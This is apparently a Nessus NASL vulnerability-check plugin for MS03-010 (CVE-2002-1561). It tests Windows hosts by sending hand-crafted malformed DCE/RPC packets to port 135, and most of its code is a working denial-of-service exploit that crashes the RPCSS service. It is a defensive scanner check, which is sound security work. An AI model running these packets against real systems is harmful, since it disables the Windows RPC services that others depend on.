#
# Test "Spike 2.7" MS RPC Services NULL pointer reference DoS
#
# Copyright (c) 2002 Pavel Kankovsky, DCIT s.r.o. <kan@dcit.cz>
# Permission to copy, modify, and redistribute this script under
# the terms of the GNU General Public License is hereby granted.
#
# This script is based on an exploit published on BugTraq:
#   Code by lion, Welcomde to HUC Website Http://www.cnhonker.com
#   2002/10/22
#

# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, added 'see also' (6/24/09)
# - Changed family (6/25/09)
# - Revised plugin title, changed family again (10/23/09)

include("compat.inc");

if (description)
{
  script_id(11159);
  script_version("$Revision: 1.26 $");
  script_cvs_date("$Date: 2014/08/20 16:45:02 $");

  script_cve_id("CVE-2002-1561");
  script_bugtraq_id(6005);
  script_osvdb_id(13414);
  script_xref(name:"MSFT", value:"MS03-010");

  script_name(english:"MS03-010: Microsoft Windows RPC Endpoint Manager Malformed Packet DoS (331953) (intrusive check)");
  script_summary(english:"Attempts to crash MS RPC service the Spike 2.7-way");

  script_set_attribute(attribute:"synopsis", value:
"The remote Windows host is affected by a denial of service
vulnerability.");
  script_set_attribute(attribute:"description", value:
"MS Windows RPC service (RPCSS) crashes trying to dereference a NULL
pointer when it receives a certain malformed request. All MS RPC-based
services (i.e. a large part of MS Windows 2000+) running on the target
machine are rendered inoperable.");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms03-010");
  script_set_attribute(attribute:"solution", value:"Apply the patch referenced in the Microsoft bulletin.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/10/18");
  script_set_attribute(attribute:"plugin_publication_date", value:"2002/11/21");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2002-2014 Pavel Kankovsky");
  script_family(english:"Windows");

  script_dependencie("find_service1.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports(135);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

#
# Prepare DCE BIND request
#

function dce_bind()
{
  local_var req_hdr, sv_uuid, sv_vers, ts_uuid, ts_vers;

  # Service UUID:
  #   B9E79E60-3D52-11CE-AAA1-00006901293F
  # (this is one of the services bound to port 135)
  sv_uuid = raw_string(
      0x60, 0x9E, 0xE7, 0xB9, 0x52, 0x3D, 0xCE, 0x11,
      0xAA, 0xA1, 0x00, 0x00, 0x69, 0x01, 0x29, 0x3F);
  # The version is incorrect "for extra fun" (should be 0.2)
  sv_vers = raw_string(0x02, 0x00, 0x02, 0x00);

  # Transfer syntar UUID:
  #   8A885D04-1CEB-11C9-9FE8-08002B104860
  ts_uuid = raw_string(
      0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
      0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60);
  ts_vers = raw_string(0x02, 0x00, 0x00, 0x00);

  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x0b, 0x03,              # BINDPACKET, flags (1st+last frag)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0x48, 0x00,              # fragment length (72)
      0x00, 0x00,              # auth length
      0x02, 0x00, 0x00, 0x00,  # call id
      0xd0, 0x16, 0xd0, 0x16,  # max xmit frag, max recv frag
      0x00, 0x00, 0x00, 0x00,  # assoc group
      0x01,                    # num ctx items
      0x00, 0x00, 0x00,        # (padding)
      0x00, 0x00,              # p_cont_id
      0x01,                    # n_transfer_syn
      0x00);                   # (padding)

  return (string(
      req_hdr, sv_uuid, sv_vers, ts_uuid, ts_vers));
}

#
# Prepare evil DCE request I
#

function attack_dce_req_1()
{
  local_var req_dt1, req_dt2, req_dt3, req_dt4, req_dt5, req_dt6, req_hdr;

  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x00, 0x01,              # REQUESTPACKET, flags (1st frag)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0xd0, 0x16,              # fragment length (5840)
      0x00, 0x00,              # auth length
      0x8f, 0x00, 0x00, 0x00,  # call id
      0x20, 0x27, 0x01, 0x00,  # alloc hint
      0x00, 0x00,              # context id
      0x02, 0x00,              # opnum: 0
      0xf0, 0x00, 0x00, 0x00,  # ?
      0x00, 0x00, 0x00, 0x00,  # ?
      0x0f, 0x00, 0x00, 0x00); # ?

  req_dt1 = crap(data:raw_string(0x41), length:240);

  req_dt2 = raw_string(
      0x88, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x88, 0x13, 0x00, 0x00);

  req_dt3 = crap(data:raw_string(0x42), length:5000);

  req_dt4 = raw_string(
      0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
      0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00);

  req_dt5 = crap(data:raw_string(0x43), length:512);

  req_dt6 = raw_string(
      0xfe, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
      0xfe, 0xff, 0x00, 0x00, 0x3d, 0x3d, 0x3d, 0x3d,
      0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d,
      0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d, 0x3d);

  return (string(
      req_hdr, req_dt1, req_dt2, req_dt3, req_dt4, req_dt5, req_dt6));
}

#
# Prepare evil DCE request II
# the size does not match fragment length?!
#

function attack_dce_req_2(ah, stuff)
{
  local_var ah0, ah1, ah2, ah3, req_dt1, req_hdr;

  # grrr...nasl barfs on (ah/xx) & 0xff
  ah0 = ah & 0xff;
  ah1 = ah / 256;       ah1 = ah1 & 0xff;
  ah2 = ah / 65536;     ah2 = ah2 & 0xff;
  ah3 = ah / 16777216;  ah3 = ah3 & 0xff;

  # Request header
  req_hdr = raw_string(
      0x05, 0x00,              # version, minor version
      0x00, 0x00,              # REQUESTPACKET, flags (none)
      0x10, 0x00, 0x00, 0x00,  # data representation (LE, ASCII, IEEE fp)
      0xd0, 0x16,              # fragment length (5840...hmmm)
      0x00, 0x00,              # auth length
      0x8f, 0x00, 0x00, 0x00,  # call id
      ah0,  ah1,  ah2,  ah3,   # alloc hint
      0x00, 0x00,              # context id
      0x02, 0x00);             # opnum: ?

  req_dt1 = crap(data:raw_string(stuff), length:5000);

  return (string(req_hdr, req_dt1));
}

#
# Prepare evil DCE request III
# this makes absolutely no sense, hmm...
# the attack appears to work without it...
#

function attack_dce_req_3()
{
  local_var req_dt1, req_hdr;

  # Request header? eh...sort of
  req_hdr = raw_string(
      0x00, 0x00, 0x01, 0x10, 0x00, 0x00, 0x00, 0x00,
      0x00, 0x00, 0x01, 0x10, 0x00, 0x00);

  req_dt1 = crap(data:raw_string(0x48), length:5000);

  return (string(req_hdr, req_dt1));
}

#
# Carry out the attack.
#

function attack(port)
{
  local_var	i, r, soc;
  # connect
  soc = NULL;
  for (i = 0; i < 3 && ! soc; i ++)
  {
    sleep(i);
    soc = open_sock_tcp(port);
  }
  if (!soc) return (1);

  # send bind request and check whether we got some reply
  # this is used as a liveness test
  send(socket:soc, data:dce_bind());
  r = recv(socket:soc, length:16);
  if (strlen(r) < 16) return (1);

  # send the evil packets
  send(socket:soc, data:attack_dce_req_1());
  send(socket:soc, data:attack_dce_req_2(ah:0x011050, stuff:0x44));
  send(socket:soc, data:attack_dce_req_2(ah:0xf980,   stuff:0x45));
  send(socket:soc, data:attack_dce_req_2(ah:0xe2b0,   stuff:0x46));
  send(socket:soc, data:attack_dce_req_2(ah:0x1560,   stuff:0x47));
  send(socket:soc, data:attack_dce_req_3());

  # see you!
  close(soc);
  return (0);
}


#
# The main program.
#

port = 135;

if (!get_port_state(port)) {
  exit(0);
}

maxtries = 5;
countdown = maxtries;

while (countdown > 0) {
  success = attack(port:port);
  if (success) {
    if (countdown == maxtries) {
      # XXX it refuses to talk to us
      # XXX should we print a warning?
      exit(0);
    }
    security_warning(port);
    exit(0);
  }
  countdown = countdown - 1;
  sleep(1);
}
